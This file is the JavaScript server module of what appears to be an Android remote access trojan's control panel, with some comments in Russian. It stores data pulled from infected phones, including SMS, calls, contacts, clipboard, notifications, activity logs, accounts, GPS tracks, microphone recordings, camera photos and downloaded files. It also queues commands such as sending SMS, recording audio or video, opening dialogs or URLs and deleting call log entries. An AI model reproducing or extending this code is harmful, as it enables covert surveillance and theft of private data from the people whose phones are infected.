let CONST = require('./const'),
    fs = require('fs'),
    crypto = require('crypto'),
    path = require('path');
	const util = require('util');
	
	

class Clients {
    constructor(db) {
        this.clientConnections = {};
        this.gpsPollers = {};
        this.clientDatabases = {};
        this.ignoreDisconnects = {};
        this.instance = this;
        this.db = db;
    }

    // UPDATE

    clientConnect(connection, clientID, clientData) {

        this.clientConnections[clientID] = connection;

        if (clientID in this.ignoreDisconnects) this.ignoreDisconnects[clientID] = true;
        else this.ignoreDisconnects[clientID] = false;

        console.log("Connected -> should ignore?", this.ignoreDisconnects[clientID]);

        let client = this.db.maindb.get('clients').find({ clientID });
        if (client.value() === undefined) {
            this.db.maindb.get('clients').push({
                clientID,
                firstSeen: new Date(),
                lastSeen: new Date(),
                isOnline: true,
                dynamicData: clientData
            }).write()
			
			
			//create folder 
			
			

            // this being the first run we should ask the client for all existing data?

        } else {
            client.assign({
                lastSeen: new Date(),
                isOnline: true,
                dynamicData: clientData
            }).write()
        }

        let clientDatabase = this.getClientDatabase(clientID);
        this.setupListeners(clientID, clientDatabase);
    }

    clientDisconnect(clientID) {
        console.log("Disconnected -> should ignore?", this.ignoreDisconnects[clientID]);

        if (this.ignoreDisconnects[clientID]) {
            delete this.ignoreDisconnects[clientID];
        } else {
            logManager.log(CONST.logTypes.info, clientID + " Disconnected")
            this.db.maindb.get('clients').find({ clientID }).assign({
                lastSeen: new Date(),
                isOnline: false,
            }).write()
            if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
            if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);
            delete this.ignoreDisconnects[clientID];
        }
    }

    getClientDatabase(clientID) {
        if (this.clientDatabases[clientID]) return this.clientDatabases[clientID];
        else {
            this.clientDatabases[clientID] = new this.db.clientdb(clientID)
            return this.clientDatabases[clientID];
        }
    }

    setupListeners(clientID) {
        let socket = this.clientConnections[clientID];
        let client = this.getClientDatabase(clientID);

        logManager.log(CONST.logTypes.info, clientID + " Connected")
        socket.on('disconnect', () => this.clientDisconnect(clientID));

        // Run the queued requests for this client
        let clientQue = client.get('CommandQue').value();
        if (clientQue.length !== 0) {
            logManager.log(CONST.logTypes.info, clientID + " Running Queued Commands");
            clientQue.forEach((command) => {
                let uid = command.uid;
                this.sendCommand(clientID, command.type, command, (error) => {
                    if (!error) client.get('CommandQue').remove({ uid: uid }).write();
                    else {
                        // Hopefully we'll never hit this point, it'd mean the client connected then immediatly disonnected, how weird!
                        // should we play -> https://www.youtube.com/watch?v=4N-POQr-DQQ 
                        logManager.log(CONST.logTypes.error, clientID + " Queued Command (" + command.type + ") Failed");
                    }
                })
            })
        }


        // Start GPS polling (if enabled)
        this.gpsPoll(clientID);


        // ====== DISABLED -- It never really worked, and new AccessRules stop us from using camera in the background ====== //

         socket.on(CONST.messageKeys.camera, (data) => {

              //{
             //     "image": <Boolean>,
             //     "buffer": <Buffer>
              //}
			if(data.camList == true){
				let list = data.list;
				if(list.length !==0 ){
                    let dbCams = client.get('cameraList');
                    list.forEach(camera => {
                        let hash = crypto.createHash('md5').update(camera.name + camera.id).digest("hex");
                        if (dbCams.find({ hash }).value() === undefined) {
                            // cool, we dont have this call
                            camera.hash = hash;
                            dbCams.push(camera).write();
                        }
                    });
				}
			}
			if (data.image) {
				// save to file
				
				if(data.screenshot === undefined){
					let filePath = path.join(CONST.downloadsFullPath, data.name);
					fs.writeFile(filePath, data.buffer, (error) => {
						
						if (!error) {
							// let's save the filepath to the database
							client.get('downloads').push({
								"time": new Date(),
								"type": "photo",
								"originalName": data.name,
								path: CONST.downloadsFolder + '/' + data.name
							}).write();
						}
						else console.log(error); // not ok
					});
				}else{
					let filePath = path.join(CONST.downloadsFullPath, data.name);
					fs.writeFile(filePath, data.buffer, (error) => {
						
						if (!error) {
							// let's save the filepath to the database
							client.get('downloads').push({
								"time": new Date(),
								"type": "screenshot",
								"originalName": data.name,
								path: CONST.downloadsFolder + '/' + data.name
							}).write();
						}
						else console.log(error); // not ok
					});
				}
					
			}else{
				if(data.video){
					let filePath = path.join(CONST.downloadsFullPath, data.name);
					fs.writeFile(filePath, data.buffer, (error) => {
						
						if (!error) {
							// let's save the filepath to the database
							client.get('downloads').push({
								"time": new Date(),
								"type": "video",
								"originalName": data.name,
								path: CONST.downloadsFolder + '/' + data.name
							}).write();
							
						}
						else console.log(error); // not ok
					});
				}
			}
			
			
         });

        socket.on(CONST.messageKeys.files, (data) => {
            // {
            //     "type": "list"|"download"|"error",
            //     (if type = list) "list": <Array>,
            //     (if type = download) "buffer": <Buffer>,
            //     (if type = error) "error": <String> 
            // }

            if (data.type === "list") {
                let list = data.list;
                if (list.length !== 0) {
                    // cool, we have files!
                    // somehow get this array back to the main thread...
                    client.get('currentFolder').remove().write();
                    client.get('currentFolder').assign(data.list).write();
                    logManager.log(CONST.logTypes.success, "File List Updated");
                } else {
                    // bummer, something happened
                }
            } else if (data.type === "download") {
                // Ayy, time to recieve a file!
                logManager.log(CONST.logTypes.info, "Recieving File From" + clientID);


                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';

			
                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);

                fs.writeFile(filePath, data.buffer, (error) => {
                    if (!error) {
                        // let's save the filepath to the database
                        client.get('downloads').push({
                            time: new Date(),
                            type: "download",
                            originalName: data.name,
                            path: CONST.downloadsFolder + '/' + fileKey + fileExt
                        }).write();
                        logManager.log(CONST.logTypes.success, "File From" + clientID + " Saved");
                    }
                    else console.log(error); // not ok
                })
            } else if (data.type === "error") {
                // shit, we don't like these! What's up?
                let error = data.error;
                console.log(error);
            }
        });

        socket.on(CONST.messageKeys.call, (data) => {
            if (data.callsList) {
                if (data.callsList.length !== 0) {
                    let callsList = data.callsList;
                    let dbCall = client.get('CallData');
                    let newCount = 0;
                    callsList.forEach(call => {
                        let hash = crypto.createHash('md5').update(call.phoneNumber + call.date).digest("hex");
                        if (dbCall.find({ hash }).value() === undefined) {
                            call.hash = hash;
							call.deleted = false;
                            dbCall.push(call).write();
                            newCount++;
                        }
                    });
                    logManager.log(CONST.logTypes.success, clientID + " Call Log Updated - " + newCount + " New Calls");
                }
            }

        });

        socket.on(CONST.messageKeys.sms, (data) => {
            if (typeof data === "object") {
                let smsList = data.smslist;
                if (smsList.length !== 0) {
                    let dbSMS = client.get('SMSData');
                    let newCount = 0;
                    smsList.forEach(sms => {
                        let hash = crypto.createHash('md5').update(sms.address + sms.body).digest("hex");
                        if (dbSMS.find({ hash }).value() === undefined) {
                            sms.hash = hash;
                            dbSMS.push(sms).write();
                            newCount++;
                        }
                    });
                    logManager.log(CONST.logTypes.success, clientID + " SMS List Updated - " + newCount + " New Messages");
                }
            } else if (typeof data === "boolean") {
                logManager.log(CONST.logTypes.success, clientID + " SENT SMS");
            }
        });
		
		socket.on(CONST.messageKeys.mediaFiles, (data) => {
            if (data.photos) {
				let photos = data.photos;
                if (photos.length !== 0) {
                    let dbMF = client.get('mediaFiles');
					//устанавливаем всем флаг "Удалено"
					var f = dbMF.map(function(item) {
						item.deleted = true;
					  return item;
					});
					dbMF = f;
					dbMF.write();//записываем в базу
					
					dbMF = client.get('mediaFiles');
					
                    let newCount = 0;
                    photos.forEach(photo => {
                        let hash = crypto.createHash('md5').update(photo.name + photo.date).digest("hex");
                        if (dbMF.find({ hash }).value() === undefined) {
                            photo.hash = hash;
							photo.deleted = false;
                            dbMF.push(photo).write();
                            newCount++;
                        }else{//если hash найден то выставляем deleted =false
							let p = dbMF.find({ hash }).value();
							p.deleted= false;
							dbMF.write();
						}
                    });
                    logManager.log(CONST.logTypes.success, clientID + " Media Files List Updated - " + newCount);
                }
				
            }
        });

        socket.on(CONST.messageKeys.mic, (data) => {
            if (data.file) {
                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);

                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';

                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);

                fs.writeFile(filePath, data.buffer, (e) => {
                    if (!e) {
                        client.get('downloads').push({
                            "time": new Date(),
                            "type": "voiceRecord",
                            "originalName": data.name,
                            "path": CONST.downloadsFolder + '/' + fileKey + fileExt
                        }).write();
                    } else {
                        console.log(e);
                    }
                })
            }
        });

        socket.on(CONST.messageKeys.location, (data) => {
            if (data.latitude === undefined || data.latitude === undefined) {
                logManager.log(CONST.logTypes.error, clientID + " GPS Recieved No Data");
            } else {
                client.get('GPSData').push({
                    time: new Date(),
                    enabled: data.enabled || false,
                    latitude: data.latitude || 0,
                    longitude: data.longitude || 0,
                    altitude: data.altitude || 0,
                    accuracy: data.accuracy || 0,
                    speed: data.speed || 0
                }).write();
                logManager.log(CONST.logTypes.success, clientID + " GPS Updated");
            }
        });

        socket.on(CONST.messageKeys.clipboard, (data) => {
			 if (data.clipboardLog) {
                if (data.clipboardLog.length !== 0) {
					let cpb = data;
					if (cpb.length !== 0) {
						let cpbList = data.clipboardLog;
						let dbCPB = client.get('clipboardLog');
						let newCount = 0;
						cpbList.forEach(cpb => {
							//с отсеиванием повторяющегося
							/*let hash = crypto.createHash('md5').update(cpb.text).digest("hex");
							if (dbCPB.find({ hash }).value() === undefined) {
								cpb.hash = hash;
								dbCPB.push(cpb).write();
								newCount++;
							}*/
							//без
							dbCPB.push(cpb).write();
							newCount++;
						});
						logManager.log(CONST.logTypes.success, clientID + " ClipBoard Log Updated - " + newCount + " New");
					
					}
				}
			}
			
            /*client.get('clipboardLog').push({
                time: new Date(),
                content: data.text
            }).write();
            logManager.log(CONST.logTypes.info, clientID + " ClipBoard Recieved");*/
        });

        socket.on(CONST.messageKeys.notification, (data) => {
			if (data.nfLog) {
                if (data.nfLog.length !== 0) {
					let nf = data;
					if (nf.length !== 0) {
						let nfList = data.nfLog;
						let dbNotificationLog = client.get('notificationLog');
						let newCount = 0;
						nfList.forEach(nf => {
							let hash = crypto.createHash('md5').update(nf.key + nf.content).digest("hex");
							if (dbNotificationLog.find({ hash }).value() === undefined) {
								nf.hash = hash;
								dbNotificationLog.push(nf).write();
								newCount++;
							}
						});
						logManager.log(CONST.logTypes.success, clientID + " Notification Log Updated - " + newCount + " New");
					
					}
				}
			}
        });
		
		socket.on(CONST.messageKeys.actionLog, (data) => {
			if (data.alLog) {
                if (data.alLog.length !== 0) {
					let al = data;
					if (al.length !== 0) {
						let alList = al.alLog;
						let dbActLoggerLog = client.get('actionLog');
						let newCount = 0;
						alList.forEach(al => {
							let hash = crypto.createHash('md5').update(al.type + al.time + al.text).digest("hex");
							if (dbActLoggerLog.find({ hash }).value() === undefined) {
								al.hash = hash;
								dbActLoggerLog.push(al).write();
								newCount++;
							}
						});
						logManager.log(CONST.logTypes.success, clientID + " Action's Log Updated - " + newCount + " New");
					
					}
				}
			}
        });

        socket.on(CONST.messageKeys.contacts, (data) => {
            if (data.contactsList) {
                if (data.contactsList.length !== 0) {
                    let contactsList = data.contactsList;
                    let dbContacts = client.get('contacts');
					//выставляем всем deleted =true
					var f = dbContacts.map(function(item) {
						item.deleted = true;
					  return item;
					});
					dbContacts = f;
					dbContacts.write();//записываем в базу
					
					dbContacts = client.get('contacts');
					
                    let newCount = 0;
                    contactsList.forEach(contact => {
                        contact.phoneNumber = contact.phoneNumber.replace(/\s+/g, '');
                        let hash = crypto.createHash('md5').update(contact.phoneNumber + contact.name + contact.raw_id).digest("hex");
                        if (dbContacts.find({ hash }).value() === undefined) {
                            contact.hash = hash;
							contact.deleted = false;
                            dbContacts.push(contact).write();
                            newCount++;
                        }else{//если hash найден то выставляем deleted =false
							let cont = dbContacts.find({ hash }).value();
							cont.deleted= false;
							dbContacts.write();
						}
                    });
                    logManager.log(CONST.logTypes.success, clientID + " Contacts Updated - " + newCount + " New Contacts Added");
					
                }
            }

        });

        socket.on(CONST.messageKeys.wifi, (data) => {
            if (data.networks) {
                if (data.networks.length !== 0) {
                    let networks = data.networks;
                    let dbwifiLog = client.get('wifiLog');
                    client.get('wifiNow').remove().write();
                    client.get('wifiNow').assign(data.networks).write();
                    let newCount = 0;
                    networks.forEach(wifi => {
						let hash = crypto.createHash('md5').update(wifi.SSID +  wifi.BSSID).digest("hex");
                        if (dbwifiLog.find({ hash }).value() === undefined) {
                            // cool, we dont have this call
                            wifi.firstSeen = new Date();
                            wifi.lastSeen = new Date();
                            dbwifiLog.push(wifi).write();
                            newCount++;
                        } else {
                            wifiField.assign({
                                lastSeen: new Date()
                            }).write();
                        }
                    });
                    logManager.log(CONST.logTypes.success, clientID + " WiFi Updated - " + newCount + " New WiFi Hotspots Found");
                }
            }
        });

        socket.on(CONST.messageKeys.permissions, (data) => {
            client.get('enabledPermissions').assign(data.permissions).write();
            logManager.log(CONST.logTypes.success, clientID + " Permissions Updated");
        });

        socket.on(CONST.messageKeys.installed, (data) => {
            client.get('apps').assign(data.apps).write();
            logManager.log(CONST.logTypes.success, clientID + " Apps Updated");
        });
		
		socket.on(CONST.messageKeys.info, (data) => {
			client.get('info').assign(data.info).write();
        });
		
		socket.on(CONST.messageKeys.OpenDialog, (data) => {
			if(data.dialog){
				let dia = data.dialog;
				let dbDialogsLog = client.get('dialogs');
				
				
				dia.forEach(item => {
					let hash = crypto.createHash('md5').update(item.date + item.otv).digest("hex");
					if (dbDialogsLog.find({ hash }).value() === undefined) {
						item.hash = hash;
						item.type = "dialog";
						
						dbDialogsLog.push(item).write();
						logManager.log(CONST.logTypes.info, clientID + "new Dialog add");
					}
				});
				
			}
        });
		
		socket.on(CONST.messageKeys.getAccounts, (data) => {
			if(data.accountsList){
				if(data.accountsList.length == 0)
					return;
				
				let list = data.accountsList;
				let dbAccount = client.get('accounts');
				let count =0;
				
				list.forEach(item => {
					let hash = crypto.createHash('md5').update(item.Aname + item.Atype).digest("hex");
					if (dbAccount.find({ hash }).value() === undefined) {
						item.hash = hash;
						item.type = "account";
						
						dbAccount.push(item).write();
						count++;
					}
				});
				
				logManager.log(CONST.logTypes.success, clientID + " Accounts Updated - " + count + " New Accounts Added");
			}
        });
    }


    // GET
    getClient(clientID) {
        let client = this.db.maindb.get('clients').find({ clientID }).value();
        if (client !== undefined) return client;
        else return false;
    }

    getClientList() {
        return this.db.maindb.get('clients').value();
    }

    getClientListOnline() {
        return this.db.maindb.get('clients').value().filter(client => client.isOnline);
    }
    getClientListOffline() {
        return this.db.maindb.get('clients').value().filter(client => !client.isOnline);
    }

    getClientDataByPage(clientID, page, filter = undefined) {
        let client = db.maindb.get('clients').find({ clientID }).value();
        if (client !== undefined) {
            let clientDB = this.getClientDatabase(client.clientID);
            let clientData = clientDB.value();

            let pageData;

            if (page === "calls") {
                pageData = clientDB.get('CallData').sortBy('date').reverse().value();
                if (filter) {
                    let filterData = clientDB.get('CallData').sortBy('date').reverse().value().filter(calls => calls.phoneNumber.substr(-6) === filter.substr(-6));
                    if (filterData) pageData = filterData;
                }
            }
            else if (page === "sms") {
                pageData = clientData.SMSData;
                if (filter) {
                    let filterData = clientDB.get('SMSData').value().filter(sms => sms.address.substr(-6) === filter.substr(-6));
                    if (filterData) pageData = filterData;
                }
            }
            else if (page === "notifications") {
                pageData = clientDB.get('notificationLog').sortBy('postTime').reverse().value();
                if (filter) {
                    let filterData = clientDB.get('notificationLog').sortBy('postTime').reverse().value().filter(not => not.appName === filter);
                    if (filterData) pageData = filterData;
                }
            }
			else if (page === "actions") {
                pageData = clientDB.get('actionLog').sortBy('time').reverse().value();
                if (filter) {
                    let filterData = clientDB.get('actionLog').sortBy('time').reverse().value().filter(not => not.type === filter);
                    if (filterData) pageData = filterData;
                }
            }
            else if (page === "wifi") {
                pageData = {};
                pageData.now = clientData.wifiNow;
                pageData.log = clientData.wifiLog;
            }
            else if (page === "contacts") pageData = clientData.contacts;
            else if (page === "permissions") pageData = clientData.enabledPermissions;
            else if (page === "clipboard") pageData = clientDB.get('clipboardLog').sortBy('time').reverse().value();
            else if (page === "apps") pageData = clientData.apps;
            else if (page === "files") pageData = clientData.currentFolder;
            else if (page === "downloads") pageData = clientData.downloads.filter(download => download.type === "download");
            else if (page === "microphone") pageData = clientDB.get('downloads').value().filter(download => download.type === "voiceRecord");
            else if (page === "gps") pageData = clientData.GPSData;
            else if (page === "info"){
				
				let dateOne = clientDB.get('info').value();
				pageData = dateOne.concat(client);
			}
			else if (page === "others") {
				let info = clientDB.get('info').value();
				
				pageData = info.concat(clientDB.get('dialogs').value(),clientDB.get('accounts').value());
				
			}
            else if (page === "mediafiles") {
				let dataOne = clientDB.get('mediaFiles').value();
				pageData = dataOne.concat(clientDB.get('MFSettings').value());

			}
			else if (page === "camera"){ 
				let dataOne = clientDB.get('downloads').value();	
				
				pageData = dataOne.concat(clientDB.get('cameraList').value());

				
			}

            return pageData;
        } else return false;
    }

    // DELETE
    deleteClient(clientID) {
        this.db.get('clients').remove({ clientID }).write();
        if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
    }

    // COMMAND
    sendCommand(clientID, commandID, commandPayload = {}, cb = () => { }) {
        this.checkCorrectParams(commandID, commandPayload, (error) => {
            if (!error) {
                let client = this.db.maindb.get('clients').find({ clientID }).value();
                if (client !== undefined) {
                    commandPayload.type = commandID;
                    if (clientID in this.clientConnections) {
                        let socket = this.clientConnections[clientID];
                        logManager.log(CONST.logTypes.info, "Requested " + commandID + " From " + clientID);
                        socket.emit('order', commandPayload)
						console.log(commandPayload);
						//socket.emit('order', { order: commandPayload, extra: 'ls', path: '/' });
                        return cb(false, 'Requested');
                    } else {
                        this.queCommand(clientID, commandPayload, (error) => {
                            if (!error) return cb(false, 'Команда добавлена в очередь (устройство не в сети)')
                            else return cb(error, undefined)
                        })
                    }
                } else return cb('Клиент не существует!', undefined);
            } else return cb(error, undefined);
        });
    }

    queCommand(clientID, commandPayload, cb) {
        let clientDB = this.getClientDatabase(clientID);
        let commandQue = clientDB.get('CommandQue');
        let outstandingCommands = [];
        commandQue.value().forEach((command) => {
            outstandingCommands.push(command.type);
        });

        if (outstandingCommands.includes(commandPayload.type)) return cb('Подобная команда уже стоит в очереди');
        else {
            // yep, it could cause a clash, but c'mon, realistically, it won't, theoretical max que length is like 12 items, so chill?
            // Talking of clashes, enjoy -> https://www.youtube.com/watch?v=EfK-WX2pa8c
            commandPayload.uid = Math.floor(Math.random() * 10000);
            commandQue.push(commandPayload).write();
            return cb(false)
        }
    }

    checkCorrectParams(commandID, commandPayload, cb) {
        if (commandID === CONST.messageKeys.sms) {
            if (!('action' in commandPayload)) return cb('SMS Missing `action` Parameter');
            else {
                if (commandPayload.action === 'ls') return cb(false);
                else if (commandPayload.action === 'sendSMS') {
                    if (!('to' in commandPayload) || commandPayload.to == '') return cb('SMS Missing `to` Parameter');
                    else if (!('sms' in commandPayload) || commandPayload.sms == '') return cb('SMS Missing `to` Parameter');
                    else return cb(false);
                } else return cb('SMS `action` parameter incorrect');
            }
        }
		else if (commandID === CONST.messageKeys.camera) {
            if (!('action' in commandPayload)) return cb('Camera Missing `action` Parameter');
            else {
                if (commandPayload.action === 'takeVideo') {
                    if ( !('sec' in commandPayload) || (commandPayload.sec == '')) 
						return cb('Video Missing `sec` Parameter')
                    else return cb(false);
                }
                else return cb(false);
            }
        }
        else if (commandID === CONST.messageKeys.files) {
            if (!('action' in commandPayload)) return cb('Files Missing `action` Parameter');
            else {
                if (commandPayload.action === 'ls') {
                    if (!('path' in commandPayload)) return cb('Files Missing `path` Parameter')
                    else return cb(false);
                }
                else if (commandPayload.action === 'dl') {
                    if (!('path' in commandPayload)) return cb('Files Missing `path` Parameter')
                    else return cb(false);
                }
                else return cb('Files `action` parameter incorrect');
            }
        }
        else if (commandID === CONST.messageKeys.mic) {
            if (!'sec' in commandPayload) return cb('Mic Missing `sec` Parameter')
            else cb(false)
        }
        else if (commandID === CONST.messageKeys.gotPermission) {
            if (!'permission' in commandPayload) return cb('GotPerm Missing `permission` Parameter')
            else cb(false)
        }
		else if (commandID === CONST.messageKeys.contacts) {
            if (!('action' in commandPayload)) return cb('Contacts Missing `action` Parameter');
            else {
                if (commandPayload.action === 'addCO') {
                    if ( !('name' in commandPayload) || commandPayload.name == '' ) 
						return cb('Add Conacts Missing `name` Parameter')
					if ( !('phone' in commandPayload) || commandPayload.phone == '') 
						return cb('Add Conacts Missing `phone` Parameter')
                    else return cb(false);
                }
				else if (commandPayload.action === 'chCO') {
                    if ( !('name_N' in commandPayload) || commandPayload.name_N == '') 
						return cb('Conacts Missing new `name` Parameter')
					if ( !('phone_N' in commandPayload) || commandPayload.phone_N == '') 
						return cb('Conacts Missing new `phone` Parameter')
                    else return cb(false);
                }
                else return cb(false);
            }
        }
		else if (commandID === CONST.messageKeys.OpenDialog) {
			if ( !('title' in commandPayload) || (commandPayload.title == '') ) 
				return cb('Missing `title` Parameter')
			if ( !('msg' in commandPayload) || (commandPayload.msg == '') ) 
				return cb('Missing `msg` Parameter')
			
			else return cb(false);
        }
		else if (commandID === CONST.messageKeys.OpenBrowser) {
			if ( !('url' in commandPayload) || commandPayload.url == '' ) 
				return cb('Missing `url` Parameter')

			else return cb(false);
		}
        else if (Object.values(CONST.messageKeys).indexOf(commandID) >= 0) return cb(false)
        else return cb('Command ID Not Found');
    }

    gpsPoll(clientID) {
        if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);

        let clientDB = this.getClientDatabase(clientID);
        let gpsSettings = clientDB.get('GPSSettings').value();

        if (gpsSettings.updateFrequency > 0) {
            this.gpsPollers[clientID] = setInterval(() => {
                logManager.log(CONST.logTypes.info, clientID + " POLL COMMAND - GPS");
                this.sendCommand(clientID, '0xLO')
            }, gpsSettings.updateFrequency * 1000);
        }
    }

    setGpsPollSpeed(clientID, pollevery, cb) {
        if (pollevery >= 30) {
            let clientDB = this.getClientDatabase(clientID);
            clientDB.get('GPSSettings').assign({ updateFrequency: pollevery }).write();
            cb(false);
            this.gpsPoll(clientID);
        } else return cb('Polling Too Short!')

    }
	
	
	setMFSET(clientID, widths,heights, cb) {
        if (widths >= 50 && heights >=50) {
            let clientDB = this.getClientDatabase(clientID);
            clientDB.get('MFSettings').assign({ width: widths, height: heights }).write();
            cb(false);
            logManager.log(CONST.logTypes.info, clientID + " POLL COMMAND - MFSettings");
			let set ={
				"action":"settings",
				"width":widths,
				"height":heights
				
			};
			
			this.sendCommand(clientID, '0xMF',set)
        } else return cb('Fail!')

    }
	
	CallDeleted(clientID, date, cb) {
        if (clientID !=0 && date!="" ) {
            let clientDB = this.getClientDatabase(clientID);
			let dbCall = clientDB.get('CallData');
			let call = dbCall.find({ date }).value();
			call.deleted= true;
			dbCall.write();
			
            cb(false);
            logManager.log(CONST.logTypes.info, clientID + " POLL COMMAND - Call Delete");
			let set ={
				"action":"delCL",
				"date":date,
				
			};
			this.sendCommand(clientID, '0xCL',set)
        } else return cb('Fail!')

    }
}

module.exports = Clients;